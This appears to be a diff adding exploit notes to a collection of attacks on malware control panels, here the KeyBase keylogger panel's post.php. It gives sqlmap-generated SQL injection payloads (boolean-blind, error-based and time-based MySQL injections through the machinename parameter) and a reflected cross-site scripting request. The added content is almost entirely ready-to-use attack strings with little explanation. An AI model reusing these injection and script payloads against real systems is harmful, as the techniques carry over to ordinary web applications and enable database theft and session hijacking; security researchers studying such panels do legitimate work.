@@ -166,3 +166,35 @@ else:
 	print "\n*RADIO* This battle is won...but the war is far from over!"
 	print "\n*RADIO* Over and OUT\n"
 ```
+
+Type: SQL injection
+
+Author: [voidsec] write by [Futex](https://voidsec.com/keybase-en/)
+
+Post.php is vulnerable to SQL Injection (Error & Blind Based), the parameters machinename, windowtitle, keystrokestyped and machinetime are not filtered properly.
+
+Sqlmap output:
+
+```
+Parameter: machinename (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: type=notification&machinename=mcstn' RLIKE (SELECT (CASE WHEN (8085=8085) THEN 0x6d6373746e ELSE 0x28 END)) AND 'jwuZ'='jwuZ&machinetime=10.02
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: type=notification&machinename=mcstn' OR (SELECT 8538 FROM(SELECT COUNT(*),CONCAT(0x716a6a7871,(SELECT (ELT(8538=8538,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'CqhA'='CqhA&machinetime=10.02
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SELECT)
+    Payload: type=notification&machinename=mcstn' OR (SELECT * FROM (SELECT(SLEEP(5)))lLhX) AND 'zYgT'='zYgT&machinetime=10.02
+```
+
+Type: XSS vulnerability
+
+Author: [voidsec] write by [Futex](https://voidsec.com/keybase-en/)
+
+```
+GET /keybase/post.php?keystrokestyped=a'"<script>alert('xss')</script>&machinename=1&machinetime=a&type=keystrokes&windowtitle=a
+```
+
